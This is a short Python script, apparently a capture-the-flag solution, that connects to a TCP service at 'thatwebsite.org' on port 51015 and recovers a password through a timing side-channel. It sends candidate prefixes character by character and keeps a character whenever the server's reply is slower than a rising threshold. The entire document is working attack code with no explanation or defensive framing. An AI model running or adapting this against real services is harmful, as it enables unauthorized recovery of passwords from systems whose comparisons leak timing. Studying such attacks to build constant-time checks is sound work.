import socket
import sys
import time

hostname = 'thatwebsite.org'
port = 51015
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
charlist='a1234567890-bcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}^|.?:;@'

sock.connect((hostname,port))
password=""
char = sock.recv(32)
print(char)
i=0
timer=0.5
firsttry=0

def tracer(text):
    start_time=time.time()
    sock.send(bytes(text, 'utf-8'))
    char = str(sock.recv(32))
    duration=time.time() - start_time
    print( "%s--- %s seconds ---%s" %(text, duration ,char))
    char=''
    return duration

while True:
    #sock.send(bytes(password, 'utf-8'))
    #letter=chr(ord('{')+i)
    letter=charlist[i]
    attempt=password+letter
    duration=tracer(attempt)
    i=i+1
    if duration >timer:
        time.sleep(0.1)
        duration=tracer(attempt)
        if duration > timer:
            password=attempt
            timer=timer + 0.5
            i=0

    time.sleep(0.1)
    
    
    
#if 'Wrong' not in char:
#   break
        
